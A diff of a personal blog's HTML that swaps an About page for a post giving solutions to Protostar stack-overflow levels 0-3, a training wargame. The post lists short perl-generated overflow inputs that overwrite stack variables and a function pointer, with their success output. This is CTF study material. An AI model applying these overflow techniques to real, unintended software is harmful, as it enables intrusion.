@@ -3,11 +3,11 @@
 <html>
 <head>
 	<meta charset="utf-8">
-	<title>About - Louis Li</title>
+	<title>Protostar Stack Exploits (Solutions 0-3) - Louis Li</title>
 	<meta name="author" content="Louis Li">
 
 	
-	<meta name="description" content="I&rsquo;m an undergraduate at Harvard University. I&rsquo;m currently pursuing a degree in Computer Science and a minor in Mathematical Sciences. &hellip;">
+	<meta name="description" content="Protostar Stack Exploits (Solutions 0-3) Overview Protostar is a series of exercises from Exploit Exercises. In addition to three final levels, it &hellip;">
 	
 
   <!-- http://t.co/dKP3o1e -->
@@ -17,7 +17,7 @@
 
 	<link href="http://feeds.feedburner.com/louisligithub" rel="alternate" title="Louis Li" type="application/atom+xml">
 	
-	<link rel="canonical" href="http://louisrli.github.io/">
+	<link rel="canonical" href="http://louisrli.github.io/blog/2012/08/18/protostar-stack0/">
 	<link href="/favicon.png" rel="shortcut icon">
 	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
 	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
@@ -85,18 +85,70 @@
 				
 			
 			<div class="mid-col-container">
-				<div id="content" class="inner"><article class="page">
-    
-    <h1 class="title">About</h1>
-    
-    <div class="entry-content"><p>I&rsquo;m an undergraduate at Harvard University. I&rsquo;m currently pursuing a degree in Computer Science and a minor in Mathematical Sciences. This site has my <a href="sideprojects">sideprojects</a> and occasional <a href="blog">blog posts</a>.</p>
+				<div id="content" class="inner"><article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+	<h1 class="title" itemprop="name">Protostar Stack Exploits (Solutions 0-3)</h1>
+	<div class="entry-content" itemprop="articleBody"><h1>Overview</h1>
 
-<p>I have diverse interests in programming and computer science, among which are (but not limited to) human-computer interaction, application security, and mobile development. Last summer, I was an intern at <a href="http://www.akiban.com/">Akiban</a>, an amazing database startup in Boston. I&rsquo;m currently an undergraduate researcher at the <a href="http://iis.seas.harvard.edu">Intelligent Interactive Systems Group</a> under <a href="http://www.eecs.harvard.edu/~kgajos/">Krzysztof Gajos</a>. I&rsquo;m also the managing developer of the iOS team at <a href="http://rover.hsa.net/">Rover</a>.</p>
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
 
-<p>I like <a href="https://github.com/louisrli/project-euler">mathematical programming puzzles</a> and <a href="/sideprojects/2013/01/12/sideprojects-2012/#exploits">wargames</a>.</p>
+<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (&ldquo;Stack&rdquo;). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels.</p>
 
-<p>Surprisingly, I do enjoy a few things unrelated to computers: running, bboying (breakdancing), and poker (particularly heads up no limit).</p>
+<p>This is the first of three posts for Stack. The first four levels are straightforward, and their corresponding posts contain little explanation (solutions). The last three levels have more potential pitfalls, and those posts contain more detailed explanations (walkthroughs).</p>
+
+<h1>Solutions</h1>
+
+<h2>Stack: Level 0</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack0">full</a>): Overwrite a variable on the stack.</p>
+
+<div>
+  <pre><code class='console'>$ perl -e &quot;print 'a'x65&quot; | ./stack0
+you have changed the 'modified' variable</code></pre>
 </div>
+
+
+<h2>Stack: Level 1</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack1">full</a>): Overwrite a variable on the stack with a specific series of hex values.</p>
+
+<div>
+  <pre><code class='console'>$ ./stack1 $(perl -e &quot;print 'a'x64 . dcba&quot;)
+you have correctly got the variable to the right value</code></pre>
+</div>
+
+
+
+
+<!-- more -->
+
+
+<h2>Stack: Level 2</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack2">full</a>): Overwrite a variable by using an environmental variable.</p>
+
+<div>
+  <pre><code class='console'>$ export GREENIE=$(echo -e &quot;$(perl -e &quot;print ax64&quot;)\n\r\n\r&quot;)
+$ ./stack2
+you have correctly modified the variable</code></pre>
+</div>
+
+
+<h2>Stack: Level 3</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack3">full</a>): Overwrite a function pointer.</p>
+
+<div>
+  <pre><code class='console'>$ objdump -d ./stack3 | grep win
+08048424 &lt;win&gt;:
+$ echo -e &quot;$(perl -e &quot;print 'a'x64&quot;)\x24\x84\x04\x08&quot; | ./stack3
+calling function pointer, jumping to 08048424
+code flow successfully changed</code></pre>
+</div>
+
+
+
+</div>
+
 </article>
 
 	<div class="share">
@@ -113,6 +165,11 @@
 
 
 
+<section id="comment">
+    <h1 class="title">Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
 </div>
 			</div>
 			<footer id="footer" class="inner"><p>
@@ -134,7 +191,10 @@ Design credit: <a href="http://shashankmehta.in/archive/2012/greyshade.html">Sha
       var disqus_shortname = 'louisrli';
       
         
-        var disqus_script = 'count.js';
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://louisrli.github.io/blog/2012/08/18/protostar-stack0/';
+        var disqus_url = 'http://louisrli.github.io/blog/2012/08/18/protostar-stack0/';
+        var disqus_script = 'embed.js';
       
     (function () {
       var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
